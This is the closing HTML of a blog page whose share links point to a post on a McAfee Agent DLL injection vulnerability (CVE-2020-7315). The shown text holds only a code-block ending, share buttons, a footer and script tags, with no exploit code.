<span class="p">}</span>
</code></pre></div></div>

  </article>
</div>

<div class="share-buttons">
  <h6>Share on: </h6>
  <ul>
    <li>
      <a href="https://twitter.com/intent/tweet?text=https://clement.notin.org/blog/2020/09/12/CVE-2020-7315-McAfee-Agent-DLL-injection/" class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
    </li>
    <li>
      <a href="https://www.reddit.com/submit?url=https://clement.notin.org/blog/2020/09/12/CVE-2020-7315-McAfee-Agent-DLL-injection/" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
    </li>
    <li>
      <a href="https://www.facebook.com/sharer/sharer.php?u=https://clement.notin.org/blog/2020/09/12/CVE-2020-7315-McAfee-Agent-DLL-injection/" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
    </li>
    <li>
      <a href="https://news.ycombinator.com/submitlink?u=https://clement.notin.org/blog/2020/09/12/CVE-2020-7315-McAfee-Agent-DLL-injection/" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
    </li>
  </ul>
</div><!-- end share-buttons -->


<div class="home-button">
  <a class="btn" href= "/" >
    Home
  </a>
</div>
    <footer>
  &copy; 2024 Cl√©ment Notin. Powered by <a href="https://jekyllrb.com/">Jekyll</a> &amp; customized <a href="https://github.com/renyuanz/leonids/">leonids theme</a>.
</footer>

  </section>
  <script type="text/javascript" src="/js/jquery-3.2.1.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script>


</body>
</html>
